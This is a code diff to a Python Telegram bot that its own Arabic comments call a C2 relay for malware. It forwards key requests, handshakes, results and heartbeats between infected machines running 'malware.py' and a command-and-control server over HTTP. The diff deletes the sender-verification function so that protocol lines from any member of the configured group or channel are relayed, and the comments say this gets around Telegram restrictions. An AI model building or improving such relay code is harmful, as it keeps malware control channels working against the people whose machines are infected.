@@ -5,7 +5,8 @@ C2 Telegram Relay Bot — وسيط فقط
 
 • الداشبورد / السيرفر يبعتوا للشات عبر c2_server مباشرة (HTTP → Telegram API).
 • هذا البوت يعمل polling للجروب المحدد وللقناة (البوت لازم يكون أدمن في القناة).
-• في الجروب: يمرّر رسائل البروتوكول القادمة من *بوت* أو من *منشور القناة المنسوخ للمناقشة*.
+• لا يُستقبل للتحكم من البشر؛ يُمرَّر فقط أسطر البروتوكول KEY_REQUEST:/HANDSHAKE:/RESULT:/HEARTBEAT:
+  من الجروب أو القناة المضبوطين، بغض النظر عن المرسل — لتفادي حظر التيليجرام بعد تقييد البوت أو خصوصية المجموعة.
 """
 
 import sys
@@ -16,7 +17,6 @@ sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 import json
 import requests
 from telegram import Update
-from telegram.constants import ChatType
 from telegram.ext import ApplicationBuilder, MessageHandler, filters, ContextTypes
 
 # ── Config ────────────────────────────────────────────────────────────
@@ -54,31 +54,6 @@ def _load_token() -> str:
     return os.environ.get("TELEGRAM_BOT_TOKEN", "")
 
 
-def _allowed_protocol_sender(update: Update) -> bool:
-    """
-    في الجروب: قبول من بوت المالوير، أو منشور القناة في مجموعة المناقشة
-    (sender_chat = قناة / is_automatic_forward).
-    """
-    msg = update.effective_message
-    if not msg:
-        return False
-    user = update.effective_user
-    if user is not None and user.is_bot:
-        return True
-    sc = getattr(msg, "sender_chat", None)
-    if sc is not None:
-        try:
-            if sc.type == ChatType.CHANNEL:
-                return True
-        except Exception:
-            pass
-        if getattr(sc, "type", None) == "channel":
-            return True
-    if getattr(msg, "is_automatic_forward", False):
-        return True
-    return False
-
-
 async def _send_protocol_reply(context: ContextTypes.DEFAULT_TYPE, text: str) -> None:
     """
     malware.py يستمع على الجروب فقط — PUBLIC_KEY و HANDSHAKE_OK لازم توصل للجروب مباشرة.
@@ -95,17 +70,17 @@ async def handle_c2_protocol(update: Update, context: ContextTypes.DEFAULT_TYPE)
     if not msg or not msg.text:
         return
 
-    chat_key = str(msg.chat.id)
-
-    if chat_key == C2_GROUP_ID:
-        if not _allowed_protocol_sender(update):
-            return
-    elif chat_key != C2_CHANNEL_ID:
-        return
-
     text = msg.text.strip()
     if not any(text.startswith(p) for p in _C2_PREFIXES):
         return
+
+    chat_key = str(msg.chat.id)
+    if chat_key != C2_GROUP_ID and chat_key != C2_CHANNEL_ID:
+        return
+
+    # لا نفلتر المرسل لأسطر البروتوكول: بعد تقييد البوت أو خصوصية المجموعة قد يصل نفس السطر
+    # بمرسل لا يُصنَّف كبوت (مثلاً مناقشة القناة)، بينما رد السيرفر للـ [C2-Server] يبدو «شغال»
+    # لأن مساره أو التوقيت يختلف. السيرفر يتحقق تشفيرياً من HANDSHAKE/RESULT.
 
     try:
         r = requests.post(
@@ -147,7 +122,7 @@ if __name__ == "__main__":
             handle_c2_protocol,
         )
     )
-    # الجروب (أو مجموعة مناقشة القناة): يقبل مرسل بوت أو منشور القناة المعاد
+    # الجروب (مناقشة القناة أو أي سوبر جروب مضبوط بنفس المعرف)
     app.add_handler(
         MessageHandler(
             filters.TEXT & filters.Chat(chat_id=int(C2_GROUP_ID)),
@@ -156,7 +131,7 @@ if __name__ == "__main__":
     )
     app.add_error_handler(error_handler)
 
-    print("🤖 C2 Relay — جروب + قناة، بروتوكول من بوت / قناة مرتبطة فقط في الجروب")
+    print("🤖 C2 Relay — جروب + قناة؛ أسطر البروتوكول تُمرَّر للسيرفر بغض النظر عن مرسل الجروب")
     print(f"   C2 Server: {C2_URL}")
     print(f"   C2 group: {C2_GROUP_ID}  |  C2 channel: {C2_CHANNEL_ID}")
     app.run_polling()
